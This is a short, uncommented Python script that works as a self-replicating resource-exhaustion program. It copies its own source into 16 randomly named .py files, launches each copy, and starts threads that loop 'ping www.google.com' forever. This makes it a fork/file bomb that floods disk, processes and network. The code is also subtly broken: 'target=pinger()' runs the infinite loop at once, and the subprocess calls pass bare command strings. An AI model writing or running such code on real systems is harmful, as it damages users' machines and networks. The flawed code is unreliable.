import random as r
import subprocess as sub
import threading
import sys
def mkname(s):
    return ''.join(r.choice(s) for i in range(100))+'.py'
def pinger():
    while True:
        sub.run('ping www.google.com')
s = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890'
names = [mkname(s) for i in range(16)]
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
for i,name in enumerate(names):
    new_file = open(name, 'w+')
    for line in lines:
        new_file.write(line)
    new_file.close()
    sub.run(f'python3 {name}')
    for i in range(10):
        thread = threading.Thread(name=f"thread[{i}]",target=pinger())
        thread.start()
        thread.join()
f.close()
